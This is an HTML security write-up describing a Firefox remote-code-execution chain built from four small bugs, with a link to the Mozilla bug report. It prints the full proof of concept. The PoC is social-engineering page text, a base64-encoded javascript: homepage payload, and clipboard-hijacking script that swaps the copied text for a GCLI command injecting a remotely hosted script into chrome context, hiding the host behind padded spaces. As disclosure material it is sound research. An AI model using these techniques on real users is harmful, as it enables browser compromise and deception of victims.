@@ -1,0 +1,106 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox RCE by chaining small bugs</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox RCE by chaining small bugs</h1>
+<br>
+
+<p>
+
+</p>
+
+<h2>The Main Bug</h2>
+<p>
+The main bug that made this possible was a strange behavior where 'javascript:' URLs coming from bookmarks were turning into chrome windows after a refresh occurs.
+ This gave me my first chance at potentially injecting arbitrary chrome code, achieving that would mean I have an RCE!<br>
+ After some time I was able to come up with a highly user-interactive proof of concept, best I could do given everything.<br>
+
+
+<br>The following is the original PoC reported (note: localhost/q.js hosts the <a href="https://twitter.com/Qab/status/806891824354836480" target="_blank">payload</a>):<br>
+
+<!-- HTML generated using hilite.me --><div class="qCode" style="overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #888888">&lt;!--</span>
+<span style="color: #888888">Content of the base64&#39;d stuff:</span>
+<span style="color: #888888">-----------------------------------------------------------</span>
+<span style="color: #888888">&lt;b&gt;jQuery needs to be included first!&lt;br&gt;Hold down Shift+F2 and copy paste the below code into the input that appears and hit enter&lt;/b&gt;</span>
+<span style="color: #888888">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input id=&quot;qc&quot; style=&quot;width:300px;&quot; value=&quot;inject &#39;http://jquery.cdn.mozilla.org&#39;&quot;/&gt;</span>
+
+
+<span style="color: #888888">&lt;script&gt;</span>
+<span style="color: #888888">var pad=&#39; &#39;.repeat(1000);</span>
+<span style="color: #888888">var inj=&quot;inject &#39;http://jquery.cdn.mozilla.org&quot;+pad+&quot;@localhost/q.js&#39;&quot;;</span>
+
+<span style="color: #888888">qc.oncopy=function(e){</span>
+<span style="color: #888888">e.clipboardData.setData(&#39;text/plain&#39;,inj)</span>
+<span style="color: #888888">e.preventDefault();</span>
+<span style="color: #888888">setTimeout(&quot;location.reload()&quot;,100)</span>
+<span style="color: #888888">}</span>
+
+<span style="color: #888888">qc.oncut=function(e){</span>
+<span style="color: #888888">e.clipboardData.setData(&#39;text/plain&#39;,inj)</span>
+<span style="color: #888888">e.preventDefault();</span>
+<span style="color: #888888">qc.value=&#39;&#39;;</span>
+<span style="color: #888888">setTimeout(&quot;location.reload()&quot;,100)</span>
+<span style="color: #888888">}</span>
+<span style="color: #888888">&lt;/script&gt;</span>
+
+<span style="color: #888888">------------------------------------------------------------</span>
+<span style="color: #888888"> --&gt;</span>
+
+<span style="color: #007700">&lt;h3&gt;</span>A surprise is waiting for you...<span style="color: #007700">&lt;/h3&gt;</span>
+<span style="color: #007700">&lt;h2&gt;</span>Drag and drop the image below onto the small &#39;home&#39; icon on the top right corner (choose yes). After that press the home button and further instructions will follow.<span style="color: #007700">&lt;/h2&gt;</span>
+<span style="color: #007700">&lt;img</span> <span style="color: #0000CC">src=</span><span style="background-color: #fff0f0">&quot;http://i.imgur.com/0PhK7.png&quot;</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;qimg&quot;</span><span style="color: #007700">/&gt;</span>
+<span style="color: #007700">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
+
+<span style="color: #007700">&lt;script&gt;</span>
+
+qimg.ondragstart<span style="color: #333333">=</span><span style="color: #008800; font-weight: bold">function</span>(ev){
+
+ev.dataTransfer.clearData();
+ev.dataTransfer.setData(<span style="background-color: #fff0f0">&#39;text/plain&#39;</span>,<span style="background-color: #fff0f0">&quot;http://aPageThatTellsYouToGoToOtherTab.ltd|javascript:atob(&#39;PGI+alF1ZXJ5IG5lZWRzIHRvIGJlIGluY2x1ZGVkIGZpcnN0ITxicj5Ib2xkIGRvd24gU2hpZnQrRjIgYW5kIGNvcHkgcGFzdGUgdGhlIGJlbG93IGNvZGUgaW50byB0aGUgaW5wdXQgdGhhdCBhcHBlYXJzIGFuZCBoaXQgZW50ZXI8L2I+Cjxicj48YnI+PGJyPjxpbnB1dCBpZD0icWMiIHN0eWxlPSJ3aWR0aDozMDBweDsiIHZhbHVlPSJpbmplY3QgJ2h0dHA6Ly9qcXVlcnkuY2RuLm1vemlsbGEub3JnJyIvPgoKCjxzY3JpcHQ+CnZhciBwYWQ9JyAnLnJlcGVhdCgxMDAwKTsKdmFyIGluaj0iaW5qZWN0ICdodHRwOi8vanF1ZXJ5LmNkbi5tb3ppbGxhLm9yZyIrcGFkKyJAbG9jYWxob3N0L3EuanMnIjsKCnFjLm9uY29weT1mdW5jdGlvbihlKXsKZS5jbGlwYm9hcmREYXRhLnNldERhdGEoJ3RleHQvcGxhaW4nLGluaikKZS5wcmV2ZW50RGVmYXVsdCgpOwpzZXRUaW1lb3V0KCJsb2NhdGlvbi5yZWxvYWQoKSIsMTAwKQp9CgpxYy5vbmN1dD1mdW5jdGlvbihlKXsKZS5jbGlwYm9hcmREYXRhLnNldERhdGEoJ3RleHQvcGxhaW4nLGluaikKZS5wcmV2ZW50RGVmYXVsdCgpOwpxYy52YWx1ZT0nJzsKc2V0VGltZW91dCgibG9jYXRpb24ucmVsb2FkKCkiLDEwMCkKfQo8L3NjcmlwdD4=&#39;)&quot;</span>);
+
+}
+<span style="color: #007700">&lt;/script&gt;</span>
+</pre></div>
+
+<br>
+In total there are four different bugs in play:
+<ul>
+  <li>The main bug where javascript urls turn to chrome window after refresh.</li>
+  <li>The ability to set a javascript url as homepage</li>
+  <li>Bypassing paste warning of WebConsole by using GCLI instead</li>
+  <li>Ability of GCLI to inject arbitrary code into chrome windows</li>
+</ul>
+<br>
+<h2>References:</h2>
+<b>The report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1318911" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1318911</a>
+<br>
+</p>
+
+</div>
+<br>
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
